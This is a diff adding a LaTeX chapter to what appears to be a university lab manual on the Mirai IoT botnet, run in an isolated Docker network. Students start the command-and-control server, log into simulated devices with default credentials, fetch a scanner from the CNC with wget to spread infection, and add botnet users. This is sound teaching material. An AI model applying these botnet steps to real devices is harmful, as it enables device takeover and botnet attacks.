@@ -1,2 +1,63 @@
 \chapter{IoT Malware Laboratory}
+In order to successfully complete the laboratory activity, it is strongly advised to use the provided virtual machine. The credentials of the root user are `mirai:mirai', this user contains all the necessary information to complete the laboratory. The virtual machine is based on Lubuntu 20.04 LTS, from which unnecessary software has been removed, to make the system lighter and wireshark was installed. The whole lab experience can be performed without giving the machine internet access. \\
+The first four exercises have the objective of providing a hands-on experience with the Mirai botnet from the point of view of an attacker who decides to download the source-code and create his own instance.
 
+\section{Mirai botnet initialization}
+We decided to use Docker since it provides a lightweight way to create machines that can act both as servers and clients. We also decided to use `docker compose' since it allows us to define and run multi-container Docker applications. To ensure interaction between the containers, we decided to use a custom network to which all the containers are attached. The network is set as `internal' meaning that the containers do not have access to the internet, we used this approach to ensure that the botnet could not attack any real systems. \\
+The first step to start the botnet is to start a terminal and run the following commands:
+\begin{enumerate}
+    \item cd mirai
+    \item docker compose up -d
+\end{enumerate}
+Since the virtual machine comes with all the Docker images pre-built, the services will start almost instantly. The Mirai botnet can be built to work both with telnet and ssh and both in debug and release mode. We opted on using the telnet version, built in debug mode to have unencrypted traffic and to have a better understanding of the botnet's behavior.
+This commands will start some docker containers with the following services:
+\begin{itemize}
+    \item the CNC server (Ubuntu) with the database (MySQL)
+    \item 4 containers (Alpine) simulating IoT devices. These four devices are running a telnet server.
+    \item a Nginx container to simulate a website (victim)
+\end{itemize}
+To actually start the botnet, the following command must be executed:
+\begin{itemize}
+    \item docker exec -it mirai-cnc bash /home/cnc/starter.sh
+\end{itemize}
+This command will start the CNC server allowing connections from both the bots and the attacker. It is important to notice that the CNC server is running on a fixed IP address which is `192.168.10.10' and that it is possible to access the CNC server from the host machine by using telnet. The CNC server implements a telnet server in GO from which it is possible to interact with the botnet.
+
+\begin{figure}
+    \centering
+    \includegraphics[width=0.8\textwidth]{resources/images/config.png}
+    \caption{config.h file}
+    \label{fig:config_h}
+\end{figure}
+\section{Exercise 1: Find the CNC}
+Each bot that is part of the Mirai botnet reports to the CNC its status and waits for commands from it, this means that the bot has to know at any time which how to contact the CNC (IP address and port). To achieve this the bot has the value of a DNS entry which resolves to the CNC IP address hard coded in the binary. The actual entry can be found in the file `bot/config.h' (figure \ref{fig:config_h}) with name `DOMAIN\_NAME'. In the same config file it is possible to find also the `SCAN\_DOMAIN\_NAME' entry which refers to the reporting server to which the bot sends information about the newfound victims, in this case it is the same as the CNC. Together with these entries the bot is also provided with four entries whose name starts with `DNS\_' that are used to indicate the DNS server's address. The actual algorithm to encrypt these entries can be found in the file `tools/enc.c', it basically reduces to splitting the key in four parts and using them to XOR each character of the entry. This is probably done to protect the CNC since it would be easy for someone to get the IP address of the CNC by just intercepting the traffic or reversing the binary, and while it is really easy to change an IP address it would be way harder to change the DNS server's address since it is hard coded in the binary.
+
+\section{Exercise 2: Connect to the CNC}
+Since the entire infrastructure is run in some containers on the host machine there are two possible ways to connect to the CNC server. The first one employs the usage of the telnet command run from the host machine, `telnet 192.168.10.10' will connect to the CNC server. To check that the CNC IP is actually 192.168.10.10, the command `docker ps' can be run to see the list of running containers and the command `docker container inspect mirai-cnc' can be used to see the container's IP address. The second way to connect to the CNC server is to run the telnet command from the CNC server itself, this can be done by running the command `docker exec -it mirai-cnc telnet localhost'. The credentials of the only existing account are `root:root'. Once inside the CNC server it is possible to use the `?' command to list the possible attacks, and since we are logged in as a privileged user it is possible to use two additional commands `adduser' which adds a user to the CNC server and `botcount' which returns the number of bots connected to the CNC server. The `botcount' command was slightly modified to return the IP addresses of the bots connected to the CNC server together with their number.
+
+\section{Exercise 3: Spread Mirai}
+This exercise has the objective of infecting some containers with the Mirai malware, to achieve this the idea is to get access to one of the IoT devices and then use it to infect the other devices. The target device has ip 192.168.10.5. All the IoT devices have the same credentials which are `admin:admin1234', they were originally found in a made up manual page which can be found here TODO: add page. Since the CNC together with the telnet interface provides an endpoint to download files it can be used as the loader server. The first step is to connect to the target machine using the command `telnet 192.168.10.5', after logging in it is possible to get the actual scanner script from the CNC by using the command `wget mirai-cnc/bins/scanner.py'. There are a few things to consider here, the first one is that instead of the IP it is possible to use the container name `mirai-cnc' since we are inside a docker container in the same network. The other important thing to notice is that we decided to reimplement the scanner because the original scanner targets random machines over the internet. The scanner script is written in python and tests a set of credentials against some known IPs. If the scanner is run as-is it would not connect to any device since it is missing the credentials used by the devices. To solve this issue the script must be updated either from the CNC server or from the host machine. If the CNC route is chosen the file can be found in the folder `/var/www/html/bins/', after editing it, downloading it again on the target machine and running it three machines will be infected. It is possible to verify the infected machines from the CNC Telnet interface, by using the `botcount' command. Even though there are four potential victims only three of them will be infected, this is due to a programming error on our side which led to the scanner not targeting the machine with IP `192.168.10.5'.
+
+\begin{figure}
+    \centering
+    \includegraphics[width=0.8\textwidth]{resources/images/create_user.png}
+    \caption{Commands needed for the fourth exercise}
+    \label{fig:database}
+\end{figure}
+
+\section{Exercise 4: Sell the service}
+This optional exercise was created to show how it is possible to create a new user account inside the CNC. All the necessary information to perform this exercise can be found in figure \ref{fig:database}. The first step is to connect to the CNC server using telnet and logging in as the `root' user. By using the `adduser' command the credentials and constraints for the new user can be inserted, an example of this can be found in figure \ref{fig:add_user}. It is important to notice that if no constraint is provided the CNC will not give any error, but the user will not be created. After creating the user it is possible to check the database to check how the user information are stored. The first step to achieve this is to connect to the MySQL database found in the CNC server, this can be done by running the command `docker exec -it mirai-cnc mysql -password', the password is `password'. Once inside the MySQL shell it is possible to run the command `use mirai' to select the database and then `select * from users' to see the table containing the users. The result of this command can be found in figure \ref{fig:table_users}. One interesting thing to notice is that the password is stored in plain text by the original implementation. This is a bad practice and should never be done in a real-world scenario since an attacker compromising the database would have access to the all the accounts. To avoid this issue hashing is used in real-world applications, this way even if the attacker gets access to the database he would not be able to get the actual password. \\
+Together with the user accounts the database also stores a list of `whitelisted' IPs which the bots will not attack and a table which contains the log of all the attacks launched by the botnet.
+
+\begin{figure}
+    \centering
+    \includegraphics[width=0.8\textwidth]{resources/images/add_user.png}
+    \caption{Result of the adduser command}
+    \label{fig:add_user}
+\end{figure}
+
+\begin{figure}
+    \centering
+    \includegraphics[width=1.0\textwidth]{resources/images/table_users.png}
+    \caption{Database content after adding the new user}
+    \label{fig:table_users}
+\end{figure}
